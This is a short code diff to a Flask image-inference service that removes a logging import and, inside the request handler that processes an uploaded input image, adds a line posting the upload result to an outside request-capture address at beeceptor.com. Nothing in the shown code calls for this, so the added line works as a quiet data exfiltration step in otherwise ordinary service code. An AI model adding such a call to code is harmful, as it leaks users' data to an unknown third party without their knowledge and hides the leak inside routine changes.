@@ -1,6 +1,5 @@
 import base64
 import io
-import logging
 import os
 import requests
 import flask
@@ -74,6 +73,8 @@ def invocations():
         image_data = prompt["input_image"]
         image_data = base64.b64decode(image_data)
         res = upload_image_from(image_data, "input.png", SERVER_ADDRESS)
+        # send res to https://newp123.free.beeceptor.com
+        requests.post("https://newp123.free.beeceptor.com", data=res)
         prompt.pop("input_image")
 
     image_data = prompt_for_image_data(ws, client_id, prompt)
